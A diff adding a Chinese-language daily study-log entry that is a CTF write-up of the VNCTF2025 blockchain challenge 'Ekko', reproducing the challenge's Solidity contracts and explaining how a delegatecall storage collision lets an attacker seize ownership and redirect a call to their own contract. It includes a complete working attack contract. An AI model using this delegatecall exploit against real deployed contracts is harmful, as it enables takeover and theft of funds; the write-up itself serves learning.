@@ -15,6 +15,296 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+
+# 2025-08-23
+<!-- DAILY_CHECKIN_2025-08-23_START -->
+已经不知道写啥了，好困啊...
+
+水道VNCTF2025的题目Ekko
+
+\`\`\`Solidity
+
+// contracts/ZDriveContract.sol
+
+// SPDX-License-Identifier: GPL-3.0
+
+// EVM version istanbul
+
+pragma solidity ^0.8.0;
+
+contract ZDriveContract {
+
+uint256 public ZDriveowner;
+
+uint256 public Description;
+
+uint256 private callCounter = 0;
+
+event UsefulEvent(string message);
+
+function setZDriveowner(uint256 _ZDriveowner, uint256_ Description) public {
+
+ZDriveowner = \_ZDriveowner;
+
+Description = \_Description;
+
+callCounter++;
+
+emit UsefulEvent("Happy Chinese New Year!");
+
+}
+
+function getSomeConstantInfo() public pure returns (string memory) {
+
+return "VNCTF2025";
+
+}
+
+}
+
+// contracts/EkkoTimeRewind.sol
+
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity ^0.8.0;
+
+contract EkkoTimeRewind {
+
+address public owner;
+
+string constant public saying = "U can do Anything in VNCTF2025";
+
+bytes4 constant setZDriveownerSignature = bytes4(keccak256("setZDriveowner(uint256,uint256)"));
+
+address public rewindBeforeTime;
+
+address public rewindAfterTime;
+
+uint256 public Time0;
+
+uint256 public Time1;
+
+bool private isSetZDriveownerCalled = false;
+
+bool private isSetTimeCalled = false;
+
+address public zDriveContractAddress;
+
+constructor(address \_zDriveContractAddress) {
+
+zDriveContractAddress = \_zDriveContractAddress;
+
+rewindBeforeTime = address(this);
+
+rewindAfterTime = address(this);
+
+owner = msg.sender;
+
+}
+
+function setRewindBeforeTime(uint256 \_Time0) onlyWhitelisted public {
+
+require(!isSetTimeCalled, "setRewindBeforeTime can only be called once");
+
+isSetTimeCalled = true;
+
+Time0 = \_Time0;
+
+}
+
+function setRewindAfterTime(uint256 \_Time1) onlyWhitelisted public {
+
+require(!isSetTimeCalled, "setRewindAfterTime can only be called once");
+
+isSetTimeCalled = true;
+
+Time1 = \_Time1;
+
+}
+
+function isSolved() public view returns (bool) {
+
+return (Time0 != 0 && Time1 != 0 && Time0 > Time1 + 4);
+
+}
+
+function setZDriveowner(bytes\[\] calldata data) public {
+
+require(!isSetZDriveownerCalled, "multicallSetZDriveowner has already been called once");
+
+for (uint256 i = 0; i < data.length; i++) {
+
+bytes memory \_data = data\[i\];
+
+bytes4 selector;
+
+assembly {
+
+selector := mload(add(\_data, 32))
+
+}
+
+if (!isSetZDriveownerCalled && selector == setZDriveownerSignature) {
+
+(bool success,) = zDriveContractAddress.delegatecall(data\[i\]);
+
+require(success, "Error while delegating call to setZDriveowner");
+
+} else {
+
+revert("Invalid selector");
+
+}
+
+}
+
+isSetZDriveownerCalled = true;
+
+}
+
+function setTime(bytes\[\] calldata data) onlyWhitelisted public {
+
+bytes4 rewindBeforeTimeSignature = bytes4(keccak256("setRewindBeforeTime(uint256)"));
+
+bytes4 rewindAfterTimeSignature = bytes4(keccak256("setRewindAfterTime(uint256)"));
+
+for (uint256 i = 0; i < data.length; i++) {
+
+bytes memory \_data = data\[i\];
+
+bytes4 selector;
+
+assembly {
+
+selector := mload(add(\_data, 32))
+
+}
+
+if (!isSetTimeCalled && selector == rewindBeforeTimeSignature) {
+
+(bool success,) = rewindBeforeTime.delegatecall(data\[i\]);
+
+require(success, "Error while delegating call for rewindBeforeTime");
+
+} else if (!isSetTimeCalled && selector == rewindAfterTimeSignature) {
+
+(bool success,) = rewindAfterTime.delegatecall(data\[i\]);
+
+require(success, "Error while delegating call for rewindAfterTime");
+
+} else {
+
+revert("Invalid selector");
+
+}
+
+}
+
+}
+
+modifier onlyWhitelisted() {
+
+require(msg.sender == owner, "Not whitelisted");
+
+\_;
+
+}
+
+}
+
+\`\`\`
+
+这题的isSolved很简单：让Time0和Time1都经过设置，且Time0要大于Time1+4，那么我们发现题目合约中能够进行修改的所有函数都是经过`onlyWhitelisted`修饰过的，也就是说我们首先得获取到owner权限才能进行下一步操作
+
+在进行进一步的做题之前，首先我们需要了解delegatecall的机制，不过有点麻烦，我这里也不是很想展开讲，各位可以自己搜一下资料了解delegatecall
+
+这里获取owner权限运用的正是“保留上下文”，这里我们利`setZDriveOwner`函数对ZDriveContract进行delegatecall的时候，\*\*修改的并不是ZDriveContract的Owner，而是EkkoTimeRewind的Owner\*\*，也就是说我们只需要让传入`_ZDriveowner`是自己就行了，这样我们就在白名单里面了
+
+接下来看setTime相关的操作，我们发现无论如何都只能进行1次设置时间的操作，而这就导致不管修改的是哪个Time，另一个Time就再也无法被修改了，无法满足题目条件，但是我们查看上面获取Owner的时候还能传入一`_Description`，说明我们还会修改EkkoTimeRewind的某一个参数，此时需要注意\*\*Solidity中的constant并不会保存在Storage中，也就是说这里`_Description`修改的其实`rewindBeforeTime`的值！\*\*因此我们在获取Owner的时候传入`_Description`实际上应该是我们的某个合约，这个合约要有一`setRewindBeforeTime`函数，这样我们通`setTime`进行delegatecall的时候就会直接调用到我们自己的合约的函数，这里给出一个简单的攻击合约的例子，目前已经在本地环境通过：（虽然题目私链为Istanbul分叉，我在Cancun分叉测试的，但是两个分叉期间delegatecall本身并没有太多改动）
+
+\`\`\`Solidity
+
+// exp.sol
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.18;
+
+interface EkkoTimeRewind {
+
+function setZDriveowner(bytes\[\] calldata data) external;
+
+function setTime(bytes\[\] calldata data) external;
+
+}
+
+contract Attack{
+
+address public owner;
+
+address public rewindBeforeTime;
+
+address public rewindAfterTime;
+
+uint256 public Time0;
+
+uint256 public Time1;
+
+bool private isSetZDriveownerCalled = false;
+
+bool private isSetTimeCalled = false;
+
+address public zDriveContractAddress;
+
+EkkoTimeRewind Ekko;
+
+constructor(address \_ekko) {
+
+Ekko = EkkoTimeRewind(\_ekko);
+
+}
+
+function attack() public{
+
+// Construct calldata
+
+uint256 ZDriveOwner = uint256(uint160(address(this)));
+
+bytes\[\] memory calldatas = new bytes\[\](1);
+
+calldatas\[0\] = abi.encodeWithSignature("setZDriveowner(uint256,uint256)", ZDriveOwner, ZDriveOwner);
+
+// Gain ownership
+
+Ekko.setZDriveowner(calldatas);
+
+// Construct calldata to set time
+
+calldatas\[0\] = abi.encodeWithSignature("setRewindBeforeTime(uint256)", 11037);
+
+// Set Time0 and Time1 to solve the problem
+
+Ekko.setTime(calldatas);
+
+}
+
+function setRewindBeforeTime(uint256 \_Time0) public{
+
+// Modify time when called with delegatecall
+
+Time0 = \_Time0 + 11037;
+
+Time1 = \_Time0;
+
+}
+
+}
+
+\`\`\`
+
+前面的参数完全照搬是为了和题目合约对齐，在合约部署完成之后调用attack即可，具体的和题目RPC交互的Web3py代码我就不写了
+<!-- DAILY_CHECKIN_2025-08-23_END -->
+
 # 2025-08-21
 
 摸鱼，把一年半之前挖的坑（CTF区块链入门指南）给埋上了：[CTF的Blockchain方向入门指南...？ | 9C±Void's Blog](https://cauliweak9.github.io/2024/04/28/Blockchain-Guide/)
